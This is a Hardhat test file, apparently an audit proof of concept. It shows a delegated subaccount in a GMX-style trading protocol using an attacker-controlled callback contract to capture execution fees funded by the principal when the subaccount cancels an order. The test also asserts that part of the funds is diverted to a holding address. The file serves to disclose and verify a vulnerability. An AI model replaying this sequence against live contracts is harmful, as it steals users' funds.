import { expect } from "chai";
import { setNextBlockBaseFeePerGas } from "@nomicfoundation/hardhat-network-helpers";

import { deployFixture } from "../../utils/fixture";
import { deployContract } from "../../utils/deploy";
import { expandDecimals, decimalToFloat } from "../../utils/math";
import { OrderType, DecreasePositionSwapType, getOrderKeys } from "../../utils/order";
import * as keys from "../../utils/keys";

describe("AUDIT: subaccount execution-fee capture", () => {
  it("routes principal-funded WNT to a subaccount-chosen callback on cancellation", async () => {
    const fixture = await deployFixture();
    const { user0: principal, user1: subaccount, user2: holding } = fixture.accounts;
    const {
      dataStore,
      router,
      subaccountRouter,
      ethUsdMarket,
      wnt,
    } = fixture.contracts;

    const attackerCallback = await deployContract("MockCallbackReceiver", []);

    await dataStore.setAddress(keys.HOLDING_ADDRESS, holding.address);
    await dataStore.setUint(keys.ESTIMATED_GAS_FEE_MULTIPLIER_FACTOR, decimalToFloat(1));
    await setNextBlockBaseFeePerGas(expandDecimals(1, 9));

    await subaccountRouter.connect(principal).addSubaccount(subaccount.address);
    await subaccountRouter
      .connect(principal)
      .setMaxAllowedSubaccountActionCount(subaccount.address, keys.SUBACCOUNT_ORDER_ACTION, 2);
    await subaccountRouter
      .connect(principal)
      .setSubaccountExpiresAt(subaccount.address, keys.SUBACCOUNT_ORDER_ACTION, 9_999_999_999);

    const supplied = expandDecimals(1, 17); // 0.1 WNT from the principal
    await wnt.mint(principal.address, supplied);
    await wnt.connect(principal).approve(router.address, supplied);

    const params = {
      addresses: {
        receiver: principal.address,
        cancellationReceiver: principal.address,
        callbackContract: attackerCallback.address,
        uiFeeReceiver: ethers.constants.AddressZero,
        market: ethUsdMarket.marketToken,
        initialCollateralToken: wnt.address,
        swapPath: [],
      },
      numbers: {
        sizeDeltaUsd: decimalToFloat(1000),
        initialCollateralDeltaAmount: supplied,
        triggerPrice: decimalToFloat(6000),
        acceptablePrice: decimalToFloat(6000),
        executionFee: supplied,
        callbackGasLimit: 0,
        minOutputAmount: 0,
        validFromTime: 0,
      },
      orderType: OrderType.LimitIncrease,
      decreasePositionSwapType: DecreasePositionSwapType.NoSwap,
      isLong: true,
      shouldUnwrapNativeToken: false,
      referralCode: ethers.constants.HashZero,
      dataList: [],
    };

    expect(await wnt.balanceOf(principal.address)).eq(supplied);
    await subaccountRouter.connect(subaccount).createOrder(principal.address, params);
    expect(await wnt.balanceOf(principal.address)).eq(0);

    const [orderKey] = await getOrderKeys(dataStore, 0, 1);
    expect(orderKey).not.eq(ethers.constants.HashZero);
    expect(await wnt.balanceOf(holding.address)).gt(0); // amount above the 100x cap is irreversibly diverted

    const callbackBalanceBefore = await ethers.provider.getBalance(attackerCallback.address);
    await subaccountRouter.connect(subaccount).cancelOrder(orderKey);
    const callbackBalanceAfter = await ethers.provider.getBalance(attackerCallback.address);

    expect(callbackBalanceAfter).gt(callbackBalanceBefore);
    expect(await getOrderKeys(dataStore, 0, 1)).deep.eq([]);
    expect(await dataStore.getUint(
      keys.subaccountActionCountKey(principal.address, subaccount.address, keys.SUBACCOUNT_ORDER_ACTION)
    )).eq(2);
  });
});
